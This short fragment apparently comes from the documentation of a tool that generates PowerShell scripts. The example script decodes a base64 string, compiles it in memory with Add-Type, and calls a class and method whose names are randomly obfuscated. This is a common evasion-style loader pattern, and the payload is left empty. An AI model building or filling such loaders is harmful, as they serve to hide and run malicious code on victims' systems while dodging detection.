## Example of generated script: 
```powershell
$whatever = "";
$dec = [Text.Encoding]::Utf8.GetString([Convert]::FromBase64String($whatever));
Add-Type -TypeDefinition $dec;
$instance = New-Object NLyFzrUAcH.lROHSqqKOH.tAAYCFSnKeCjCNmLDiMRUjbYm;
$instance.WIipmgARoQKYblptUhKmhjZFA();
```
